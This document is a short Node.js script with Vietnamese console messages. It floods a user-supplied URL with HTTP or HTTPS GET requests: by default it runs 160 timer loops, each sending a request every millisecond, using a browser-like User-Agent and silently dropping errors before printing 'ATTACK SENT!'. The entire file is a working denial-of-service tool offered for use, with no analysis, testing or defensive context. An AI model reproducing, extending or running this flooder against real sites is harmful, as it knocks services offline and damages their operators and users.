const http = require('http');
const https = require('https');
const url = require('url');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let target = process.argv[2];
let threads = parseInt(process.argv[3]) || 160;

if (!target) {
    rl.question('URL: ', (input) => {
        target = input;
        if (!target) {
            console.log('Lỗi: chưa nhập URL');
            process.exit(1);
        }
        startAttack();
        rl.close();
    });
} else {
    startAttack();
}

function startAttack() {
    const parsed = url.parse(target);
    const isHttps = parsed.protocol === 'https:';
    const options = {
        hostname: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.path || '/',
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    };

    function flood() {
        setInterval(() => {
            const req = (isHttps ? https : http).request(options, (res) => {
                res.on('data', () => {});
            });
            req.on('error', () => {});
            req.end();
        }, 1);
    }

    for (let i = 0; i < threads; i++) {
        flood();
    }

    console.log(` ATTACK SENT! ${target} với ${threads} THREADS`);
}